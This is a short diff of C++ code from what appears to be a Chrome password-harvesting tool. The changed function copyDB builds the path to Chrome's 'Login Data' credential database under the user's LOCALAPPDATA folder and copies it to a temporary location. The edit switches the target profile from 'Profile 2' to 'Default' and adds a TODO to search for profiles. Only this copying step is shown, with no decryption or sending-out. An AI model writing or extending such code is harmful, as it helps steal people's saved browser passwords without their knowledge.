@@ -174,8 +174,9 @@ sqlite3* getDBHandler(char* dbFilePath) {
 bool copyDB(char *source, char *dest) {
 	//Form path for Chrome's Login Data 
 	string path = getenv("LOCALAPPDATA");
-//	path.append("\\Google\\Chrome\\User Data\\Default\\");
-	path.append("\\Google\\Chrome\\User Data\\Profile 2\\");
+	// TODO Search for profile
+	path.append("\\Google\\Chrome\\User Data\\Default\\");
+//	path.append("\\Google\\Chrome\\User Data\\Profile 2\\");
 	path.append(source);
 
 	string destPath = strTempPath + dest;
